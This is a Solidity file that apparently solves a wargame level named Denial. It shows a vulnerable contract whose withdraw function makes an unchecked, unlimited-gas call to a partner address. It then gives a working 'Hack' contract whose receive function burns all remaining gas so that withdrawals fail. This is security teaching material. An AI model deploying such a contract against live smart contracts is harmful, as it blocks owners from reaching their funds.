// SPDX-License-Identifier: MIT

// the goal of this level is to deny the owner from withdrawing funds when the call the withdraw function
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// to solve this level, we can implant a denial of service attack on the contract
// This contract's vulnerability comes from the withdraw method which does not mitigate against possible attack through execution of some unknown external contract code through call method. call did not set a gas limit that external call can use.
// The call method here can invoke the receive method of a malicious contract at partner address. And this is where we're going to eat up all gas so that withdraw function reverts with out of gas exception.
contract Hack {
    uint256 n;

    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}

// set the contract address as a partner
